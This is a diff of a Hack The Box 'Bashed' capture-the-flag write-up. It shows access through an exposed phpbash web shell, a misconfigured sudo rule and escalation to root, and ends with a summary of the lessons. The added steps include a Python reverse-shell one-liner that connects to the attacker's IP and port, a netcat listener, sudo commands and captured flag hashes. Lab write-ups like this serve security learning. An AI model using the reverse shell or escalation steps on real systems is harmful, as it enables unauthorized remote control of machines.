@@ -1,6 +1,5 @@
 
 
-
 IP = 10.10.10.68
 
 we right away see a website
@@ -87,48 +86,80 @@ as we can see there we have http://10.10.10.68/dev/phpbash.php
 
 We are told that the server is build on [phpbash]([https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash))
 
-with that we can go the the site an
 
-where we have a bash shell 
+Inside phpbash:
+
 ```
-www-data@bashed
-
-:/var/www/html/dev# ls
-
-phpbash.min.php  
-phpbash.php  
-
-www-data@bashed
-
-:/var/www/html/dev# cd /home
-
-  
-
-www-data@bashed
-
-:/home# ls
-
-  
-arrexel  
-scriptmanager  
-
-www-data@bashed
-
-:/home# cd arrexel
-
-  
-
-www-data@bashed
-
-:/home/arrexel# ls
-
-  
-user.txt  
-
-www-data@bashed
-
-:/home/arrexel# cat user.txt
-
-  
-1ce2c16b4364f457a0c1626122f5025c
+whoami      # www-data
+id           # uid=33(www-data)
+ls /home     # arrexel, scriptmanager
+sudo -l
 ```
+
+We discover a key privilege escalation path:
+
+```
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+```
+
+This means www-data can run any command as `scriptmanager`, using `sudo`.
+
+Although we cannot use `su scriptmanager` (no password), we can execute commands as `scriptmanager` with:
+
+```
+sudo -u scriptmanager <command>
+```
+
+We check `/scripts`:
+
+```
+sudo -u scriptmanager ls -la /scripts
+```
+
+We find a Python file named `test.py` owned by `scriptmanager`, which we can modify:
+
+```
+`echo 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])' | sudo -u scriptmanager tee /scripts/test.py > /dev/null`
+```
+Note: `10.10.14.11` is the VPN IP of the attacking machine
+
+### Listener:
+
+```
+nc -lvnp 4444
+```
+
+### Trigger the reverse shell:
+
+```
+sudo -u scriptmanager python /scripts/test.py
+```
+
+This gives us a reverse shell as `scriptmanager` on our local machine.
+
+Once inside as `scriptmanager`, we check:
+
+```
+sudo -l
+```
+
+If allowed to run everything:
+
+```
+sudo /bin/bash
+```
+
+Now we are root:
+
+```
+whoami    # root
+cat /root/root.txt
+07e7b90a784d3f7d0c4ee08c0be62774
+cat /home/arrexel/user.txt
+817fffdd4cc7a8865c6f07e304a4150d
+```
+
+
+sum
+In the _Bashed_ Hack The Box machine, initial access was obtained through an exposed `phpbash.php` web shell running as the low-privileged `www-data` user. During enumeration, it was discovered that `www-data` had misconfigured `sudo` permissions, allowing it to run any command as the `scriptmanager` user without requiring a password. Although direct switching to `scriptmanager` wasn’t possible, we leveraged `sudo -u scriptmanager` to inject a Python reverse shell into a writable script file (`/scripts/test.py`). By triggering this file, we received a reverse shell connection back to our local Mac, this time as `scriptmanager`. From there, a simple privilege escalation was achieved by running `/bin/bash` as root using `sudo`, completing the compromise and granting access to both the user and root flags. This box serves as a lesson in the dangers of exposed dev tools, overly permissive `sudo` rules, and unmonitored script execution paths.
